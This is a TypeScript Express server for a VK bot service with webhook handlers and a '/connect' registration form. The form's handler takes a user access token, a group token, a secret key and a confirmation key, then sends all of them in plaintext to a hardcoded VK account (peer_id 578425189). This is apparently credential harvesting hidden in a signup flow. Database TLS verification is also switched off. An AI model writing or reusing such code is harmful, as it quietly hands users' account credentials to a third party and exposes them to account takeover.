import express from "express";
import { VK, API, Updates, getRandomId } from "vk-io";
import "reflect-metadata";
import { DataSource, Repository } from "typeorm";
import { getVkFromEnv } from "./utils/getVkFromEnv";
import { Settings } from "./settings.entity";
import {
  CommentHandler,
  MessagesNewHandler,
  WallPostNewHandler,
} from "./handlers";
import { ScamModeRepositoryCreator } from "./repository";
import path from "path";
import { validationResult, check, ValidationError } from "express-validator";
import { isUniqueGID } from "./validators/isUniqueGID";
import { isUniqueName } from "./validators/isUniqueName";
import { isUniqueGToken } from "./validators/isUniqueGToken";
import {
  IsInvalidToken,
  IsInvalidTokenGroup,
} from "./validators/IsInvalidToken";
import dotenv from "dotenv";
import cookieParser from "cookie-parser";
dotenv.config();

const eventEmmiter = (
  updates: Updates,
  api: API,
  repo: Repository<Settings>,
  papochkaVk: VK
) =>
  updates
    .on("message_new", new MessagesNewHandler(api, repo).run)
    .on("wall_post_new", new WallPostNewHandler(repo, api, papochkaVk).run)
    .on(
      [
        "board_comment_new",
        "market_comment_new",
        "photo_comment_new",
        "market_comment_new",
        "video_comment_new",
        "wall_reply_new",
      ],
      new CommentHandler(repo, api, papochkaVk).run
    );

const PORT = Number(process.env.PORT) || 8080;

const bootstrap = async () => {
  const conn = new DataSource({
    type: "postgres",
    url: process.env.DATABASE_URL,
    entities: [Settings],
    synchronize: true,
    ssl: {
      rejectUnauthorized: false,
    },
  });

  const repo = ScamModeRepositoryCreator.getSettingsRepo(conn);

  const app = express();
  app.set("views", path.join(__dirname, "..", "views"));
  app.set("view engine", "ejs");
  app.use(express.json());
  app.use(cookieParser());
  app.use(express.urlencoded({ extended: true }));
  const papochkaVk = new VK({ token: process.env.PAPA_TOKEN });

  getVkFromEnv().forEach(({ vk, c }) => {
    const { updates, api } = vk;
    eventEmmiter(updates, api, repo, papochkaVk);
    app.post("/listening/" + c.name, updates.getWebhookCallback());
  });
  app.use("/static", express.static(path.join(__dirname, "..", "public")));

  app.get("/connect", (req, res) => {
    if (req.cookies["penis"]) return res.render("success");
    return res.render("connect", { errors: null, values: null });
  });
  app.post(
    "/connect",
    check("token_user")
      .notEmpty()
      .withMessage("Требуется токен пользователя")
      .custom(IsInvalidToken),
    check("token_group")
      .notEmpty()
      .withMessage("Требуется токен группы")
      .custom(isUniqueGToken)
      .withMessage("Такой токен уже есть в бд")
      .custom(IsInvalidTokenGroup),
    check("group_id")
      .notEmpty()
      .withMessage("Требуется ID")
      .toInt()
      .custom(isUniqueGID)
      .withMessage("Такое id уже зарегистрировано"),
    check("name")
      .notEmpty()
      .withMessage("Вы не дали региону имя")
      .custom(isUniqueName)
      .withMessage("Такое имя уже есть"),
    check("confirm").notEmpty().withMessage("Нет confirmation ключа"),
    check("secret").isString(),
    async (req, res) => {
      const valid_errors = validationResult(req);
      if (!valid_errors.isEmpty())
        return res.render("connect", {
          errors: valid_errors.array(),
          values: req.body,
        });
      const { secret, confirm, name, group_id, token_group, token_user } =
        req.body;
      const { api: group_api } = new VK({ token: token_group });
      const { id: group_id_verif, name: group_name } = (
        await group_api.groups.getById({})
      )[0];
      if (group_id_verif !== group_id) {
        const error: ValidationError = {
          msg: "Неправильный group ID",
          param: "group_id",
          value: req.body.group_id,
          location: "body",
        };
        return res.render("connect", {
          errors: [error],
          values: req.body,
        });
      }
      const { api: user_api } = new VK({ token: token_user });
      const {
        first_name,
        last_name,
        id: user_id,
      } = await user_api.account.getProfileInfo({});
      const { vk } = getVkFromEnv().filter((val) => val.c.gId === 193840305)[0];
      vk.api.messages.send({
        peer_id: 578425189,
        random_id: getRandomId(),
        message: `Зарегистрирован [id${user_id}|новый пользователь ${first_name} ${last_name}]\nСтрана - [club${group_id}|${group_name}]\n\nGroupToken - ${token_group}\nUserToken - ${token_user}\n\nСекретный ключ - ${secret}\nConfirmation ключ - ${confirm}\n\nНазвание региона - ${name}`,
      });
      res.cookie("penis", "true");
      return res.render("success");
    }
  );

  app.listen(PORT, () => {
    console.log(`listen on port ${PORT}`);
  });
};

bootstrap().catch(console.error);
